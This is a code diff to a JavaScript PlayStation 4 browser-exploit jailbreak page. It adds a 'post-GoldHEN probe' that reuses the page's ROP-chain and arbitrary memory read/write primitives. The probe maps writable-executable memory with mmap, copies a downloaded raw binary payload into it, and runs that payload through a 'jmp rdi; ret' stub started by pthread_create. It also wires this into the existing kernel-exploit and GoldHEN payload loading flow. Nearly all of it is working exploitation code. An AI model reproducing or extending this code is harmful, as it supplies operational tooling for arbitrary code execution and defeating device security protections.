@@ -2017,6 +2017,131 @@ function runPreGoldhenDiagnostic() {
   request.send();
 }
 
+// Post-GoldHEN injectability probe. Reuses the SAME raw payload as the
+// pre-GoldHEN diagnostic (`./ludora-pre-goldhen-probe.bin`) but injects it
+// AFTER GoldHEN has taken over. The question it answers: after GoldHEN patches
+// the kernel, are the browser's ROP/mmap/pthread + memory-read primitives still
+// alive enough to inject a second raw payload and observe its status page?
+//   - status page reaches DONE/FAILED -> post-GoldHEN injection works,
+//     the downloader can be delivered the same way (plan half 1).
+//   - status page stays at stage 0 / no magic / browser crashes -> primitives
+//     are dead, the downloader must be delivered via GoldHEN AutoRun instead.
+function runPostGoldhenProbe() {
+  var traceId = 'pgpost-' + Date.now().toString(16) + '-' + Math.floor(Math.random() * 0xffff).toString(16);
+  var firmware = (navigator.userAgent.match(/PlayStation 4[ /]([\d.]+)/i) || [])[1] || '9.00';
+  var settled = false;
+  var interval = null;
+  var deadline = Date.now() + PRE_GOLDHEN_DIAG_TIMEOUT_MS;
+  var lastSequence = -1;
+  var statusView = null;
+
+  function finish(message, status) {
+    if (settled) return;
+    settled = true;
+    if (interval !== null) clearInterval(interval);
+    msgs.textContent = preGoldhenStatusText(traceId, status || { stage: 0, result: 0, detail0: 0, detail1: 0 },
+      message + '\n' + preGoldhenText('preGoldhen.postProbeFinished', 'Post-GoldHEN injection probe finished.'));
+    msgs.style.color = status && status.stage === PRE_GOLDHEN_STAGE_DONE ? '#9dff9d' : 'yellow';
+  }
+
+  function snapshot() {
+    return {
+      magic: statusView[0] >>> 0,
+      version: statusView[1] >>> 0,
+      stage: statusView[2] >>> 0,
+      result: statusView[3] | 0,
+      detail0: statusView[4] >>> 0,
+      detail1: statusView[5] >>> 0,
+      sequence: statusView[6] >>> 0,
+    };
+  }
+
+  function poll() {
+    var status = snapshot();
+    if (status.sequence !== lastSequence) {
+      lastSequence = status.sequence;
+      msgs.textContent = preGoldhenStatusText(traceId, status, preGoldhenText('preGoldhen.postProbeCollecting', 'Collecting post-GoldHEN injection evidence…'));
+      preGoldhenTrace(traceId, firmware, preGoldhenStageSlug(status.stage), status.stage, status.result, 'post-detail=' + status.detail0 + ',' + status.detail1);
+    }
+    if (status.magic === PRE_GOLDHEN_MAGIC && (status.stage === PRE_GOLDHEN_STAGE_DONE || status.stage === PRE_GOLDHEN_STAGE_FAILED)) {
+      finish(status.stage === PRE_GOLDHEN_STAGE_DONE
+        ? 'Post-GoldHEN injection succeeded.'
+        : 'Post-GoldHEN payload reached ' + preGoldhenStageName(status.detail0) + '.', status);
+      return;
+    }
+    if (Date.now() >= deadline) {
+      var detail = status.magic === PRE_GOLDHEN_MAGIC
+        ? preGoldhenText('preGoldhen.postProbeTimeoutAfterStage', 'Post-GoldHEN probe timed out after reaching {stage}.', { stage: preGoldhenStageName(status.stage) })
+        : preGoldhenText('preGoldhen.postProbeNoEntry', 'Post-GoldHEN injection produced no entry acknowledgement (browser primitives appear dead after GoldHEN).');
+      preGoldhenTrace(traceId, firmware, 'post-timeout', status.stage, status.result, detail);
+      finish(detail, status);
+    }
+  }
+
+  msgs.textContent = preGoldhenText('preGoldhen.postProbeDownloading', 'Ludora post-GoldHEN probe\nTrace: {trace}\nInjecting raw payload after GoldHEN…', { trace: traceId });
+  preGoldhenTrace(traceId, firmware, 'post-download', 0, 0, 'post-goldhen probe requested');
+  var request = new XMLHttpRequest();
+  request.responseType = 'arraybuffer';
+  request.open('GET', './ludora-pre-goldhen-probe.bin', true);
+  request.setRequestHeader('X-Ludora-Diagnostic', 'post-goldhen');
+  request.onreadystatechange = function () {
+    if (request.readyState !== 4 || settled) return;
+    if (request.status !== 200 || !request.response) {
+      preGoldhenTrace(traceId, firmware, 'post-download-failed', request.status, 0, 'HTTP ' + request.status);
+      finish(preGoldhenText('preGoldhen.postProbeDownloadFailed', 'Post-GoldHEN payload download failed: HTTP {status}.', { status: request.status }));
+      return;
+    }
+    try {
+      var data = new Uint8Array(request.response);
+      if (data.length < 4 || (data[0] === 0x7f && data[1] === 0x45 && data[2] === 0x4c && data[3] === 0x46)) {
+        throw Error(preGoldhenText('preGoldhen.postProbeInvalidPayload', 'The post-GoldHEN probe payload is not a raw binary.'));
+      }
+      var payloadBytes = (data.byteLength + 3) & ~3;
+      var payloadPages = (payloadBytes + 0xfff) & ~0xfff;
+      var mappingBytes = (payloadPages + 0x1000) * 4;
+      var payloadBase = chain.sysp('mmap', 0, mappingBytes, 7, 0x1002, -1, 0);
+      var payloadWords = array_from_address(payloadBase, mappingBytes / 4);
+      payloadWords.fill(0, 0, mappingBytes / 4);
+      var padded = new Uint8Array(payloadBytes);
+      padded.set(data, 0);
+      payloadWords.set(new Uint32Array(padded.buffer), 0);
+      statusView = array_from_address(payloadBase.add(PRE_GOLDHEN_STATUS_OFFSET), PRE_GOLDHEN_STATUS_WORDS);
+      statusView.fill(0, 0, PRE_GOLDHEN_STATUS_WORDS);
+
+      var loaderAddress = chain.sysp('mmap', 0, 0x1000, 7, 0x41000, -1, 0);
+      var loaderStub = array_from_address(loaderAddress, 1);
+      loaderStub[0] = 0x00C3E7FF; // jmp rdi; ret
+      var pthread = malloc(0x10);
+      var dispatchResult = chain.call_int('pthread_create', pthread, 0, loaderAddress, payloadBase);
+      var dispatchStatus = { stage: 0, result: dispatchResult, detail0: 0, detail1: 0 };
+      msgs.textContent = preGoldhenStatusText(traceId, dispatchStatus, preGoldhenText('preGoldhen.postProbeWaitingEntry', 'pthread_create returned {result}. Waiting for post-GoldHEN payload entry acknowledgement…', { result: dispatchResult }));
+      preGoldhenTrace(traceId, firmware, 'post-pthread-create', 0, dispatchResult, 'post payload bytes=' + data.byteLength);
+      if (dispatchResult !== 0) {
+        finish(preGoldhenText('preGoldhen.postProbeDispatchFailed', 'pthread_create failed before the post-GoldHEN payload could start.'), dispatchStatus);
+        return;
+      }
+      interval = setInterval(poll, 100);
+      poll();
+    } catch (error) {
+      var detail = error && error.message ? error.message : String(error);
+      preGoldhenTrace(traceId, firmware, 'post-dispatch-error', 0, -1, detail);
+      finish(preGoldhenText('preGoldhen.postProbeDispatchError', 'Post-GoldHEN probe dispatch failed: {detail}.', { detail: detail }));
+    }
+  };
+  request.onerror = function () {
+    preGoldhenTrace(traceId, firmware, 'post-download-error', 0, -1, 'network error');
+    finish(preGoldhenText('preGoldhen.postProbeNetworkFailed', 'Post-GoldHEN payload download failed: network error.'));
+  };
+  request.send();
+}
+
+function startGoldhenThenProbe() {
+  startGoldhen();
+  // Give GoldHEN time to take over the kernel before attempting the second
+  // injection. A browser crash here is itself a valid negative answer.
+  setTimeout(runPostGoldhenProbe, 8000);
+}
+
 function startGoldhen() {
   runPayload('./goldhen_2.4b18.10.bin', function () {
     startLudoraStage();
@@ -2030,6 +2155,10 @@ kexploit().then(() => {
     var params = new URLSearchParams(window.location.search);
     if (params.get('diagnose') === 'pre') {
       runPreGoldhenDiagnostic();
+      return;
+    }
+    if (params.get('diagnose') === 'post') {
+      startGoldhenThenProbe();
       return;
     }
     startGoldhen();
